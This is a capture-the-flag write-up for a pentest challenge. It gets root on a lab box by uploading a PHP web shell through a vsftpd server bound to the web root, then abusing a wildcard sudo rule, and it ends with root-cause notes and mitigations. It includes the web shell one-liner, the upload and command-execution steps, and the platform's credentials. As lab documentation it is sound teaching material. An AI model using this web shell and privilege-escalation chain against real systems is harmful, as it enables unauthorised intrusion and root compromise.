# Writeup: Srvs - Pentest Challenge

## Challenge Information
- **Challenge Name:** Srvs
- **Points:** 1000
- **Solves:** 0
- **Flag Format:** cybercon{}

## Initial Setup

### 1. Launch Instance
```bash
curl http://8.216.34.114:1234/api/run/pentest_srvs -u ctf:PhrasesFromTheHitchhikersGuideToTheGalaxy
```
**Response:**
```
[*] Your instance id: ef7e7e64018549cea5df5a86d8fc2bb3
[*] Host port: 11540
[+] Instance: OK
[*] This Instance will auto-terminated in 500 sec
[+] Go ahead. Please access port 11540
```

### 2. SSH Connection
```bash
ssh -o StrictHostKeyChecking=no pen@8.216.34.114 -p 11540
```
**Password:** `071371415f3d490c9597d2410ec49361`

## Reconnaissance

### System Information
- **OS:** Ubuntu 22.04.5 LTS
- **Current User:** pen (uid=1000, gid=1000, groups=1000(pen),1001(dev))
- **Services Running:**
  - SSH (port 22)
  - Apache2 (port 80) - running as user `dev`
  - VSFTPD (FTP server) - running as root

### Key Findings

#### 1. User Privileges
```bash
$ whoami && id
pen
uid=1000(pen) gid=1000(pen) groups=1000(pen),1001(dev)
```

#### 2. VSFTPD Configuration
Located at `/etc/vsftpd.conf`:
```ini
listen=YES
listen_ipv6=NO
listen_address=127.0.0.1
background=NO

local_enable=YES
write_enable=YES

guest_enable=YES
guest_username=dev
virtual_use_local_privs=YES

chroot_local_user=YES
allow_writeable_chroot=YES
local_root=/var/www/html

seccomp_sandbox=NO
pam_service_name=vsftpd
utf8_filesystem=YES

pasv_enable=YES
pasv_min_port=21100
pasv_max_port=21101
pasv_address=127.0.0.1

anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES

local_umask=022
```

**Critical Configuration Issues:**
- `guest_enable=YES` + `guest_username=dev` - Guest users mapped to `dev` user
- `local_root=/var/www/html` - FTP chroot to web root
- `anon_upload_enable=YES` - Anonymous upload allowed
- `write_enable=YES` - Write operations enabled

#### 3. Sudo Privileges for dev User
```bash
$ sudo -l
User dev may run the following commands on 63a73d8cc0b9:
    (root) NOPASSWD: /home/dev/*
```

## Exploitation

### Step 1: Create Web Shell
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

### Step 2: Upload via FTP
```bash
curl -T /tmp/shell.php ftp://pen:071371415f3d490c9597d2410ec49361@localhost/shell.php
```

**Verification:**
```bash
$ ls -la /var/www/html/
total 28
drwxr-sr-x 1 dev dev  4096 Sep 13 01:21 .
drwxrwxr-x 1 dev dev  4096 Sep  9 11:44 ..
-rwxr-xr-x 1 dev dev 10671 Sep  9 11:44 index.html
-rw-r--r-- 1 dev dev    31 Sep 13 01:21 shell.php
```

### Step 3: Test Web Shell
```bash
curl "http://localhost/shell.php?cmd=whoami"
# Output: dev
```

### Step 4: Find Flag
```bash
curl "http://localhost/shell.php?cmd=find%20/%20-name%20%27*flag*%27%202>/dev/null"
# Output: /flag.txt

curl "http://localhost/shell.php?cmd=ls%20-la%20/flag.txt"
# Output: -r-x------ 1 root root 47 Sep  9 11:44 /flag.txt
```

### Step 5: Privilege Escalation
The flag file is only readable by root. However, the `dev` user has sudo privileges to run any file in `/home/dev/*` as root without password.

**Create exploit script:**
```bash
curl "http://localhost/shell.php?cmd=echo%20%22cat%20/flag.txt%22%20%3E%20/home/dev/readflag.sh"
curl "http://localhost/shell.php?cmd=chmod%20%2Bx%20/home/dev/readflag.sh"
```

**Execute with root privileges:**
```bash
curl "http://localhost/shell.php?cmd=sudo%20/home/dev/readflag.sh"
```

## Flag

**cybercon{ftp_srv_must_n0t_be_binded_t0_varwww}**

## Vulnerability Analysis

### Root Cause
The main vulnerability is in the VSFTPD configuration:

1. **FTP to Web Root Binding:** VSFTPD is configured with `local_root=/var/www/html`, allowing uploaded files to be directly accessible via web server
2. **Guest User Mapping:** Guest users are mapped to the `dev` user, which has sudo privileges
3. **Anonymous Upload:** Anonymous upload is enabled, allowing file uploads without authentication
4. **Sudo Misconfiguration:** The `dev` user can execute any file in `/home/dev/*` as root without password

### Attack Chain
1. Upload malicious PHP file via FTP (exploiting guest user mapping)
2. Access uploaded file via web server (exploiting FTP-to-web binding)
3. Execute commands as `dev` user via web shell
4. Create script in `/home/dev/` and execute with root privileges (exploiting sudo misconfiguration)
5. Read flag file with root privileges

### Mitigation
1. **Separate FTP and Web Directories:** Don't bind FTP root to web root
2. **Disable Anonymous Upload:** Set `anon_upload_enable=NO`
3. **Restrict Guest Users:** Don't map guest users to privileged accounts
4. **Sudo Restrictions:** Use more specific sudo rules instead of wildcard paths
5. **File Upload Validation:** Implement proper file type validation and storage outside web root

## Tools Used
- **curl** - For API calls and file uploads
- **ssh** - For remote access
- **ftp** - For file transfer
- **Desktop Commander MCP** - For process management and file operations

## Learning Points
- Always separate file upload directories from web-accessible directories
- Be cautious with sudo wildcard permissions
- Guest user mappings can lead to privilege escalation
- FTP servers should not be bound to web roots in production environments
